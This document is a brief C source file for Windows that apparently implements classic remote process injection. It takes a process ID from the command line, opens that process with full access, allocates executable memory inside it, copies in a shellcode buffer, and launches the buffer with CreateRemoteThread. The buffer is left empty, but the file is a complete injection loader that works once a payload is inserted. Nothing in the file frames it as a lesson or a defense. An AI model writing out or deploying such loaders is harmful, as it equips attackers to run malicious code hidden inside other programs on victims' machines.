#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "";

int main(int argc, char *argv[]) {
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[1])));
    PVOID b_shellcode = VirtualAllocEx(h_process, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, b_shellcode, shellcode, sizeof shellcode, NULL);
    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)b_shellcode, NULL, 0, NULL);
}